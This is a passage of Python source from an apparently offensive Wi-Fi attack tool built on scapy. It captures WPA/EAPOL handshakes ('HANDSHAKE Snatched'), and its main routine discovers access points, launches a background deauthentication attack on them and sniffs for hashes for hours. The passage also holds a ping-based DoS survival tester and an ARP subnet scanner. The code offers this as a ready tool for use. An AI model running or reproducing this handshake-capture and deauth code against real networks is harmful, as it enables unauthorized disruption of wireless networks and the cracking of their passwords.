            """This will parse that hoe"""


            # ADDR1 == DST 
            # ADDR2 AND ADDR3 == SRC



            # ONLY EAPOL // HANDSHAKES
            if pkt.haslayer(EAPOL):



                # GET ADDR1 & ADRR2
                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False

                sd = "Client" # DST FOR ADDR2 DST FOR SRC

                
                # GET SSID

                for mac, ssid in cls.ssids:

                    if ssid.strip() == addr1 or ssid == addr2:
                        
                        sd = ssid


                if addr1:

                    console.print(f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {sd} --> {addr1} --> {pkt}")

                

                if addr2:

                    console.print(f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {addr2} --> {sd}  --> {pkt}")

                
                    #console.input("\nENTER TO CONTINUE: ")
            

           # else:
           # console.print(pkt)   # ABOVE AND TO THE LEFT IS FOR DEBUGGING
        


        # SNIFF FOR HASHES
        sniffer()
    


    @classmethod
    def main(cls):
        """This will run class wide logic"""



        # CLEAN VARS
        cls.ssids = []
        cls.mac_ifo = []
        cls.SNIFF = True


        # CATCH
        try:

            # GET IFACE
            cls.iface = Frame_Snatcher.get_interface()


            # WELCOME
            Frame_Snatcher.welcome_ui(iface=cls.iface)


            # FIND APS
            Hash_Snatcher.sniff_for_ap(iface=cls.iface)


            # SMALL DEAUTH ON APS
            threading.Thread(target=Hash_Snatcher.target_attacker, args=(cls.iface, ), daemon=True).start()


            # SNIFF FOR HASHES
            Hash_Snatcher.sniff_for_hashes(iface=cls.iface, timeout=60*240)

            
            # END
            console.input("\n\n[bold green]Press Enter to Return: ")
        
        
        except KeyboardInterrupt as e:
            console.print(f"[bold red]Exception Error:[yellow] {e}")



        except Exception as e:
            console.print(f"[bold red]Exception Error:[yellow] {e}")




# THIS CLASS IS STRICTLY TO BE USED AS A VICTIM NODE TO TEST IF THIS MODULE IS FUNCTIONAL 
class You_Cant_DOS_ME():
    """This is testing ground for weather or not i can withstand a ddos attack"""


    def __init__(self):
        pass


    @classmethod
    def ping(cls, host="google.com", timeout=4, verbose=False):
        """Create the ping packet and send it out"""


        # PRINT WELCOME
        text = pyfiglet.figlet_format(text="DOS\n ME", font="bloody")
        console.print(text, style="bold red")

        console.input("\n[bold red]ARE U READY ?: ")
        
        online = True
        pings = 0

        # TALK SHII FOR FUN
        talks = [
            "You can't hit me offline — I host the cloud.",
            "Yawn... I'm still online.",
            "Your net too slow to even scan me.",
            "My packets run laps around yours.",
            "Bro I deauth for fun.",
            "Your IP is giving home router energy.",
            "My Wi-Fi's got better uptime than your excuses.",
            "I don't lag — I throttle reality.",
            "My ping is lower than your standards.",
            "Try harder... I'm behind 3 VPNs and your girl’s Wi-Fi.",
            "You scan ports, I open wormholes.",
            "Your whole setup runs on hope and Starbucks Wi-Fi.",
            "Deauth me? I deauth back with feelings.",
            "Nice packet — shame it never reached me.",
            "You can’t trace me — I lost myself years ago."
        ]

        
        while True:
            try:
                
                # CREATE PACKET AND GET HOST
                ip = socket.gethostbyname(str(host))
                console.print(ip)
                ping = IP(dst=ip) / ICMP()

                
                # ERROR CHECK
                console.print(ping)
                time.sleep(3)

                break


            # CTRL + C
            except KeyboardInterrupt as e:
                console.print(e)

                return
            
            except Exception as e:
                console.print(f"[bold red]Socket Exception Error: {e}")
                time.sleep(3)
                return
            
            
        # LOOP THAT BITCH
        while online:

            try:
            
                # TRACK PING TIME
                time_start = time.time()
                response = sr1(ping, timeout=timeout, verbose=verbose)

                time_took = time.time() - time_start

                
                if response:
                    console.print(f"[bold blue]Connection Status: [bold green]Online  -  Latency: {time_took:.2f}")
                

                else:
                    console.print(f"[bold blue]Connection Status: [bold red]Offline  -  I HATE YOU")



                    
                pings += 1 
                if time_took < 1.0:
                    time.sleep(1.5)


                ran = random.randint(0,10)

                if ran == 4:

                    console.print(talks[random.randint(0,14)])
            


            
            # CTRL + C
            except KeyboardInterrupt as e:
                console.print("\n",e)
                
                console.input("[bold yellow]Press Enter to leave: ")
                console.print("\nReturning to Main Menu", style="bold green")
                time.sleep(2)

                break
        

            except Exception as e:

                # SET ONLINE TO FALSE
                console.print(f"[bold red]Exception Error: {e}")




# FOR MODULE TESTING
if __name__ == "__main__":
    
    
    from scapy.all import Ether, ARP, IP, srp
    


    sub = console.input("Enter subnet: ")

    subnet = ipaddress.ip_network(sub)


    arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(subnet))

    response = srp(arp, timeout=3)[0]


    for sent, recv in response:
        
        ip = recv.psrc
        mac = recv.hwsrc


        if ip:
            console.print(f"IP: {ip} --> MAC: {mac}", style="bold green")
        